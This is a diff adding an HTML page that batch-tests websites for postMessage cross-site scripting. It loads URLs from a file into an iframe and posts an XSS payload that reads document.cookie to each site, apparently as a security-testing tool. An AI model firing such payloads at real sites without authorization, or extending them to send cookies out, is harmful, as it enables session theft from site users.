@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<meta charset="utf-8">
+<body>
+
+<h1>postMessage Vulnerability Testing</h1>
+
+<form onsubmit="printSite()">
+	Website to check: <br>
+	<input type="text" name="website" id="website">
+	
+</form>	
+<button onclick="postMes()"> Submit </button>
+
+<iframe id="vulnsite" name="siteb" src="" sandbox="allow-forms allow-popups allow-same-origin allow-scripts" > </iframe>
+<input type="file" name="file" id="file">
+<script>
+    function printSite()
+	{
+		var site= document.getElementById('website').value;
+		window.alert(site);
+	}
+	var counter=0;
+	var website;
+	function postMes()
+	{
+		counter++;
+		frames[0].postMessage('<img src=x onerror=console.log(document.cookie)>','*');
+		console.log("Sent!",website,counter-1);
+		
+
+	}
+	//document.getElementById('vulnsite').src="vulnsite.html";
+	document.getElementById('file').onchange = function()
+	{
+
+	  var file = this.files[0];
+
+	  var reader = new FileReader();
+	  reader.onload = function(progressEvent){
+		// Entire file
+		//console.log(this.result);
+
+		// By lines
+		var lines = this.result.split('\n');
+		var line = 0;
+		var interval = setInterval(function() {
+			if (line >= lines.length) {
+				clearInterval(interval);
+			}
+			else {
+				website=lines[line];
+				document.getElementById('vulnsite').src=lines[line++];
+				
+			}
+		}, 2000);
+		/*	
+		for(var line = 0; line < lines.length; line++){
+		  
+		  //alert(lines[line]);
+		  setInverval(function() 
+		  {
+			document.getElementById('vulnsite').src=lines[line];
+		  },2000)
+		  
+		}
+		*/
+	  };
+	  reader.readAsText(file);
+	};
+	document.getElementById('vulnsite').onchange=function()
+	{
+		document.getElementById('vulnsite').src = document.getElementById('vulnsite').src;
+	}
+	document.getElementById('vulnsite').onload=function()
+	{
+			postMes();
+	}
+  
+
+</script>
+
+</body>
+
+</html>
